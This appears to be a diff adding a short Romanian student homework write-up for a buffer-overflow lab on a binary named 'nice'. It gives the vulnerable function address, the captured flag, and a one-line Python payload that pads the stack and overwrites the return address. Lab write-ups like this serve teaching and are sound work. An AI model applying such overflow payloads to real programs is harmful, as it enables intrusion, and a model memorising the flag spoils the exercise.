@@ -1,0 +1,23 @@
+Moraru Anemona Maria
+323 CC
+Ianuarie 2021 
+
+Tema 4
+
+1. Analiza binarului
+
+Adresa functiei vulnerabile gasite in fisierul "nice" este:
+
+0804935a
+
+Aceasta adresa este vulnerabila deoarece stocheaza un numar de bytes mai mare
+decat numarul pe caree stiva il poate retine.
+
+
+2. Spargerea binarului
+
+NICE_FLAG{a5dd33c86ac49b0568912d2a5b8d347f}
+
+Pyload-ul folosit este:
+
+python -c 'print "a"*166 + "b"*401 + "c"*46 + "d"*53 + "e"*371 + "f"*(449 + 8) + "\x91\x92\x04\x08"' > payload
